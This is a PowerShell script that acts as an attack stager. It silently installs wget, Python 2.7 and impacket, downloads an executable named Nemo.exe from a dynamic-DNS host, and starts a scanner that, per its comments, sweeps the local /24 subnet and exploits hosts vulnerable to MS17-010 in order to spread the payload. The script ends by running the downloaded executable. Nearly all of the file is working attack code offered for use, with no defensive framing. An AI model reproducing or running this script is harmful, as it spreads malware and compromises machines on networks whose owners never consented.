# Setup
$father = '10.1.1.1'
$save_dir = $env:temp
#$save_path = '' + $save_dir + '\' + $filename;

# TODO
# Add x84 and x64 options


function get_wget {
        $filename = "wget.exe"
        $wgetBinLocation = '' + $save_dir + '\' + $filename;
        #$client = New-Object System.Net.WebClient
        #https://eternallybored.org/misc/wget/
        write-host "Downloading Wget!"
        $url = "https://eternallybored.org/misc/wget/1.20/32/wget.exe"
        (New-Object System.Net.WebClient).DownloadFile($url, $wgetBinLocation)
        return $wgetBinLocation
}


function download_file_and_install($url,$name,$wgetBinLocation){

# Dont ask why a loop LOL
1..1 | % {
# Downlaod
$filename = "$_" + $name
$Location = '' + $save_dir + '\' + $filename;
Start-Process -FilePath $wgetBinLocation -Args " $url -O $Location" -passthru -NoNewWindow -Wait
# Install
Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
        }
}


######################################################################################################
# First, Downlaod wget
$wgetBinLocation = get_wget


# Download and install python
#download_file_and_install "https://www.python.org/ftp/python/2.7/python-2.7.msi" "p.msi" $wgetBinLocation
#https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
download_file_and_install "https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi" "p.msi" $wgetBinLocation



# Download pip and install it to download and install impacket
$Location = '' + $save_dir + '\' + 'get-pip.py';
Start-Process -FilePath $wgetBinLocation -Args " https://bootstrap.pypa.io/get-pip.py -O $Location" -passthru -NoNewWindow -Wait

# Install impacket - Why? Becasue worawit/MS17-010 uses it
c:\python27\python $Location
c:\python27\python -m pip  install impacket


# Download Nemo.exe/WinDef.exe to send to the other vuln devices.
$Location = '' + $save_dir + '\' + 'Nemo.exe';
Start-Process -FilePath $wgetBinLocation -Args "http://ritrit.ddns.net/Nemo.exe -O $Location" -passthru -NoNewWindow -Wait


# Get all valid IPs (The IPs in /24)
# For example: If the target has 192.168.1.1 it will get all 192.168.1.0/24 IPs
# Then ping them if an IP is alive, it will be checked for MS17 then Exploit
c:\python27\python $save_dir\scan.py
# NOTE: ^WinDef.exe <- Nemo.exe should be in the same dir as scan.py and zzz_exploit.py



##### Ignore this:
#$filename = "wget.exe"
#$Location = '' + $save_dir + '\' + $filename;
#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden
#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden

#Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\2.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\3.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait

#iex "msiexec /a C:\Windows\Temp\1.msi /qb TARGETDIR=C:\python27"


if (!(Test-Path "C:\POCNemo.txt")){
        .\$Location
}